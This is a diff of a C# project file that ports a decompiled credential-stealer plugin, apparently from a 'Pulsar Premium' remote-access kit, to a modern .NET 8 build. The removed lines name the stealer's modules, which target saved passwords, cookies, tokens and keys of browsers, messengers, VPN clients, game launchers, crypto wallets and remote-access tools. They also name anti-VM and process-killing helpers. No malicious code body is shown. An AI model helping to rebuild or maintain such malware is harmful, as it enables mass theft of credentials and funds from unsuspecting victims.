@@ -1,198 +1,29 @@
-﻿<?xml version="1.0" encoding="utf-8"?>
-<Project ToolsVersion="4.0" DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
-  <!--Project was exported from assembly: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll-->
+﻿<Project Sdk="Microsoft.NET.Sdk">
+
   <PropertyGroup>
-    <Configuration Condition=" '$(Configuration)' == '' ">Debug</Configuration>
-    <Platform Condition=" '$(Platform)' == '' ">AnyCPU</Platform>
-    <ProjectGuid>{8DAF99DA-0508-48B6-A422-58F2EEB2231D}</ProjectGuid>
+    <TargetFramework>net8.0-windows</TargetFramework>
     <OutputType>Library</OutputType>
-    <AssemblyName>Stealerv37</AssemblyName>
-    <TargetFrameworkVersion>v4.7.2</TargetFrameworkVersion>
-    <ApplicationVersion>1.0.0.0</ApplicationVersion>
-    <FileAlignment>512</FileAlignment>
+    <UseWindowsForms>true</UseWindowsForms>
+    <AllowUnsafeBlocks>true</AllowUnsafeBlocks>
+    <CopyLocalLockFileAssemblies>true</CopyLocalLockFileAssemblies>
+    <AssemblyName>Pulsar.Plugin.Client</AssemblyName>
+    <GenerateAssemblyInfo>false</GenerateAssemblyInfo>
+    <Configurations>Debug;Release</Configurations>
+    <Platforms>AnyCPU</Platforms>
   </PropertyGroup>
-  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Debug|AnyCPU' ">
-    <PlatformTarget>AnyCPU</PlatformTarget>
-    <DebugSymbols>true</DebugSymbols>
-    <DebugType>full</DebugType>
-    <Optimize>false</Optimize>
-    <OutputPath>bin\Debug\</OutputPath>
-    <DefineConstants>DEBUG;TRACE</DefineConstants>
-    <ErrorReport>prompt</ErrorReport>
-    <WarningLevel>4</WarningLevel>
-  </PropertyGroup>
-  <PropertyGroup Condition=" '$(Configuration)|$(Platform)' == 'Release|AnyCPU' ">
-    <PlatformTarget>AnyCPU</PlatformTarget>
-    <DebugType>pdbonly</DebugType>
-    <Optimize>true</Optimize>
-    <OutputPath>bin\Release\</OutputPath>
-    <DefineConstants>TRACE</DefineConstants>
-    <ErrorReport>prompt</ErrorReport>
-    <WarningLevel>4</WarningLevel>
-  </PropertyGroup>
+
   <ItemGroup>
-    <Reference Include="System" />
-    <Reference Include="System.Core" />
-    <Reference Include="System.Drawing" />
-    <Reference Include="System.IO.Compression" />
-    <Reference Include="System.Management" />
-    <Reference Include="System.Net.Http" />
-    <Reference Include="System.Numerics" />
-    <Reference Include="System.Security" />
-    <Reference Include="System.Web" />
-    <Reference Include="System.Windows.Forms" />
-    <Reference Include="System.Xml" />
-    <Reference Include="System.Xml.Linq" />
-    <Reference Include="netstandard" />
+    <PackageReference Include="System.Management" Version="8.0.0" />
+    <PackageReference Include="System.IO.Hashing" Version="8.0.0" />
   </ItemGroup>
+
+  <!-- Exclude Legacy Costura/Fody stuff which is replaced by modern .NET SingleFile if needed, 
+       or just not needed for a library plugin -->
   <ItemGroup>
-    <Compile Include="_003CModule_003E.cs" />
-    <Compile Include="Stealerv37_ProcessedByFody.cs" />
-    <Compile Include="System\Runtime\CompilerServices\RefSafetyRulesAttribute.cs" />
-    <Compile Include="Intelix\Targets\ITarget.cs" />
-    <Compile Include="Intelix\Targets\Vpn\Cisco.cs" />
-    <Compile Include="Intelix\Targets\Vpn\CyberGhost.cs" />
-    <Compile Include="Intelix\Targets\Vpn\ExpressVPN.cs" />
-    <Compile Include="Intelix\Targets\Vpn\Hamachi.cs" />
-    <Compile Include="Intelix\Targets\Vpn\HideMyName.cs" />
-    <Compile Include="Intelix\Targets\Vpn\IpVanish.cs" />
-    <Compile Include="Intelix\Targets\Vpn\MullVad.cs" />
-    <Compile Include="Intelix\Targets\Vpn\NordVpn.cs" />
-    <Compile Include="Intelix\Targets\Vpn\OpenVpn.cs" />
-    <Compile Include="Intelix\Targets\Vpn\PIAVPN.cs" />
-    <Compile Include="Intelix\Targets\Vpn\ProtonVpn.cs" />
-    <Compile Include="Intelix\Targets\Vpn\Proxifier.cs" />
-    <Compile Include="Intelix\Targets\Vpn\RadminVPN.cs" />
-    <Compile Include="Intelix\Targets\Vpn\SoftEther.cs" />
-    <Compile Include="Intelix\Targets\Vpn\SurfShark.cs" />
-    <Compile Include="Intelix\Targets\Vpn\WireGuard.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Discord.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Element.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Icq.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Jabber.cs" />
-    <Compile Include="Intelix\Targets\Messangers\MicroSIP.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Outlook.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Pidgin.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Signal.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Skype.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Telegram.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Tox.cs" />
-    <Compile Include="Intelix\Targets\Messangers\Viber.cs" />
-    <Compile Include="Intelix\Targets\Games\BattleNet.cs" />
-    <Compile Include="Intelix\Targets\Games\ElectronicArts.cs" />
-    <Compile Include="Intelix\Targets\Games\Epic.cs" />
-    <Compile Include="Intelix\Targets\Games\Growtopia.cs" />
-    <Compile Include="Intelix\Targets\Games\Minecraft.cs" />
-    <Compile Include="Intelix\Targets\Games\Riot.cs" />
-    <Compile Include="Intelix\Targets\Games\Roblox.cs" />
-    <Compile Include="Intelix\Targets\Games\Steam.cs" />
-    <Compile Include="Intelix\Targets\Games\Uplay.cs" />
-    <Compile Include="Intelix\Targets\Games\XBox.cs" />
-    <Compile Include="Intelix\Targets\Device\GameList.cs" />
-    <Compile Include="Intelix\Targets\Device\InstalledBrowsers.cs" />
-    <Compile Include="Intelix\Targets\Device\InstalledPrograms.cs" />
-    <Compile Include="Intelix\Targets\Device\ProcessDump.cs" />
-    <Compile Include="Intelix\Targets\Device\ProductKey.cs" />
-    <Compile Include="Intelix\Targets\Device\ScreenShot.cs" />
-    <Compile Include="Intelix\Targets\Device\SystemInfo.cs" />
-    <Compile Include="Intelix\Targets\Device\WifiKey.cs" />
-    <Compile Include="Intelix\Targets\Crypto\CryptoDesktop.cs" />
-    <Compile Include="Intelix\Targets\Crypto\Grabber.cs" />
-    <Compile Include="Intelix\Targets\Browsers\Chromium.cs" />
-    <Compile Include="Intelix\Targets\Browsers\CryptoChromium.cs" />
-    <Compile Include="Intelix\Targets\Browsers\CryptoGecko.cs" />
-    <Compile Include="Intelix\Targets\Browsers\Gecko.cs" />
-    <Compile Include="Intelix\Targets\Browsers\UserAgentGenerator.cs" />
-    <Compile Include="Intelix\Targets\Applications\AnyDesk.cs" />
-    <Compile Include="Intelix\Targets\Applications\CoreFtp.cs" />
-    <Compile Include="Intelix\Targets\Applications\CyberDuck.cs" />
-    <Compile Include="Intelix\Targets\Applications\DynDns.cs" />
-    <Compile Include="Intelix\Targets\Applications\FileZilla.cs" />
-    <Compile Include="Intelix\Targets\Applications\FoxMail.cs" />
-    <Compile Include="Intelix\Targets\Applications\FTPCommander.cs" />
-    <Compile Include="Intelix\Targets\Applications\FTPGetter.cs" />
-    <Compile Include="Intelix\Targets\Applications\FTPNavigator.cs" />
-    <Compile Include="Intelix\Targets\Applications\FTPRush.cs" />
-    <Compile Include="Intelix\Targets\Applications\GithubGui.cs" />
-    <Compile Include="Intelix\Targets\Applications\JetBrains.cs" />
-    <Compile Include="Intelix\Targets\Applications\MobaXterm.cs" />
-    <Compile Include="Intelix\Targets\Applications\Navicat.cs" />
-    <Compile Include="Intelix\Targets\Applications\Ngrok.cs" />
-    <Compile Include="Intelix\Targets\Applications\NoIp.cs" />
-    <Compile Include="Intelix\Targets\Applications\Obs.cs" />
-    <Compile Include="Intelix\Targets\Applications\PlayIt.cs" />
-    <Compile Include="Intelix\Targets\Applications\PuTTY.cs" />
-    <Compile Include="Intelix\Targets\Applications\RDCMan.cs" />
-    <Compile Include="Intelix\Targets\Applications\Rdp.cs" />
-    <Compile Include="Intelix\Targets\Applications\Sunlogin.cs" />
-    <Compile Include="Intelix\Targets\Applications\TeamSpeak.cs" />
-    <Compile Include="Intelix\Targets\Applications\TeamViewer.cs" />
-    <Compile Include="Intelix\Targets\Applications\TotalCommander.cs" />
-    <Compile Include="Intelix\Targets\Applications\WinSCP.cs" />
-    <Compile Include="Intelix\Targets\Applications\Xmanager.cs" />
-    <Compile Include="Intelix\Helper\AntiVirtual.cs" />
-    <Compile Include="Intelix\Helper\BlobParsedData.cs" />
-    <Compile Include="Intelix\Helper\ConcurrentLong.cs" />
-    <Compile Include="Intelix\Helper\CpuInfo.cs" />
-    <Compile Include="Intelix\Helper\HwidGenerator.cs" />
-    <Compile Include="Intelix\Helper\ImpersonationHelper.cs" />
-    <Compile Include="Intelix\Helper\IpApi.cs" />
-    <Compile Include="Intelix\Helper\MutexControl.cs" />
-    <Compile Include="Intelix\Helper\NativeMethods.cs" />
-    <Compile Include="Intelix\Helper\ParseKeyBlob.cs" />
-    <Compile Include="Intelix\Helper\ProcessKiller.cs" />
-    <Compile Include="Intelix\Helper\ProcessWindows.cs" />
-    <Compile Include="Intelix\Helper\RandomStrings.cs" />
-    <Compile Include="Intelix\Helper\RegistryParser.cs" />
-    <Compile Include="Intelix\Helper\RestoreCookies.cs" />
-    <Compile Include="Intelix\Helper\WindowsInfo.cs" />
-    <Compile Include="Intelix\Helper\Sql\BerkeleyDB.cs" />
-    <Compile Include="Intelix\Helper\Sql\SqLite.cs" />
-    <Compile Include="Intelix\Helper\Hashing\PBE.cs" />
-    <Compile Include="Intelix\Helper\Hashing\PBKDF2.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\AesGcm.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\AesGcm256.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\Asn1Der.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\Asn1DerObject.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\Blowfish.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\ChaCha20Poly1305.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\CngDecryptor.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\DpApi.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\LocalEncryptor.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\LocalState.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\Navicat11Cipher.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\NSSDecryptor.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\NssDumpMasterKey.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\RC4Crypt.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\TripleDes.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\Xor.cs" />
-    <Compile Include="Intelix\Helper\Encrypted\YaAuthenticatedData.cs" />
-    <Compile Include="Intelix\Helper\Data\Counter.cs" />
-    <Compile Include="Intelix\Helper\Data\InMemoryZip.cs" />
-    <Compile Include="Intelix\Helper\Data\Paths.cs" />
-    <Compile Include="Pulsar\Plugins\Client\Stealer.cs" />
-    <Compile Include="CvMega\Helper\Client.cs" />
-    <Compile Include="CvMega\Helper\MutexControl.cs" />
-    <Compile Include="CvMega\Helper\RandomPathGenerator.cs" />
-    <Compile Include="CvMega\Helper\RegeditKey.cs" />
-    <Compile Include="CvMega\Helper\SimpleEncryptor.cs" />
-    <Compile Include="Costura\AssemblyLoader.cs" />
-    <Compile Include="AssemblyInfo.cs" />
+    <Compile Remove="Costura\**" />
+    <EmbeddedResource Remove="costura\**" />
+    <Compile Remove="Stealerv37_ProcessedByFody.cs" />
+    <Compile Remove="_003CModule_003E.cs" />
   </ItemGroup>
-  <ItemGroup>
-    <EmbeddedResource Include="costura.metadata" />
-    <EmbeddedResource Include="costura\costura\dll.compressed" />
-    <EmbeddedResource Include="costura\costura\pdb.compressed" />
-    <EmbeddedResource Include="costura\messagepack\annotations\dll.compressed" />
-    <EmbeddedResource Include="costura\messagepack\dll.compressed" />
-    <EmbeddedResource Include="costura\microsoft\bcl\asyncinterfaces\dll.compressed" />
-    <EmbeddedResource Include="costura\microsoft\net\stringtools\dll.compressed" />
-    <EmbeddedResource Include="costura\pulsar\common\dll.compressed" />
-    <EmbeddedResource Include="costura\system\buffers\dll.compressed" />
-    <EmbeddedResource Include="costura\system\collections\immutable\dll.compressed" />
-    <EmbeddedResource Include="costura\system\memory\dll.compressed" />
-    <EmbeddedResource Include="costura\system\numerics\vectors\dll.compressed" />
-    <EmbeddedResource Include="costura\system\threading\tasks\extensions\dll.compressed" />
-  </ItemGroup>
-  <Import Project="$(MSBuildToolsPath)\Microsoft.CSharp.targets" />
+
 </Project>
